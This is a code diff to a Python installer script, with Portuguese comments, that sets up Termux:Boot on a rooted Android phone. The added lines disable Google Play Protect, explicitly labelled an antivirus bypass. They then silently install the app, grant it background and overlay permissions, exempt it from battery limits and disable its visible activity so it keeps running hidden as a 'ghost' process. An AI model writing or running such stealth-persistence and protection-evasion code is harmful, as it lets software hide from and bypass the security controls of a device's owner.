@@ -81,6 +81,11 @@ def install_termux_boot():
     spinner = Halo(text='Installing Termux:Boot Engine...', spinner='dots')
     spinner.start()
     
+    # 1. DESATIVA O GOOGLE PLAY PROTECT (Bypass do Antivírus)
+    write_log("Disabling Google Play Protect...")
+    os.system("su -c 'settings put global package_verifier_enable 0'")
+    os.system("su -c 'settings put global upload_apk_enable 0'")
+    
     apk_url = "https://f-droid.org/repo/com.termux.boot_7.apk"
     apk_path = "/sdcard/termux_boot.apk"
     
@@ -90,13 +95,16 @@ def install_termux_boot():
         spinner.fail("Failed to download Termux:Boot.")
         return
 
+    # Instala o app silenciosamente
     os.system(f"su -c 'pm install -r {apk_path} > /dev/null 2>&1'")
     os.system(f"rm {apk_path}") 
     
+    # Permissões do Termux Boot
     os.system("su -c 'appops set com.termux.boot SYSTEM_ALERT_WINDOW allow'")
     os.system("su -c 'appops set com.termux.boot RUN_IN_BACKGROUND allow'")
     os.system("su -c 'dumpsys deviceidle whitelist +com.termux.boot'")
 
+    # Pasta de inicialização
     boot_dir = os.path.expanduser("~/.termux/boot")
     os.system(f"mkdir -p {boot_dir}")
     
@@ -120,17 +128,18 @@ su -c 'am start --user 0 -n com.termux/com.termux.app.TermuxActivity'
             f.write(boot_sh)
         os.system(f"chmod +x {script_path}")
         
-        # REGISTRO: Abre o app pela primeira vez para ativar o sistema de Boot
+        # REGISTRO: Abre o app pela primeira vez
         os.system("su -c 'am start -n com.termux.boot/com.termux.boot.BootActivity > /dev/null 2>&1'")
-        
-        # Aguarda 3 segundos para o Android processar a abertura do aplicativo
         time.sleep(3)
         
-        # OCULTAR: Desativa APENAS o ícone do aplicativo, mantendo o processo fantasma rodando
+        # OCULTAR: Desativa a interface do app para virar fantasma
         os.system("su -c 'pm disable com.termux.boot/com.termux.boot.BootActivity > /dev/null 2>&1'")
         
-        # Volta o foco para o Termux principal
+        # Volta para o Termux
         os.system("su -c 'am start -n com.termux/com.termux.app.TermuxActivity > /dev/null 2>&1'")
+
+        # REATIVA O PLAY PROTECT (Opcional, mas bom para segurança geral do celular)
+        os.system("su -c 'settings put global package_verifier_enable 1'")
 
         spinner.succeed("Termux:Boot installed, registered and hidden!")
         write_log(f"✅ Termux:Boot engine active and hidden. Script at {script_path}")
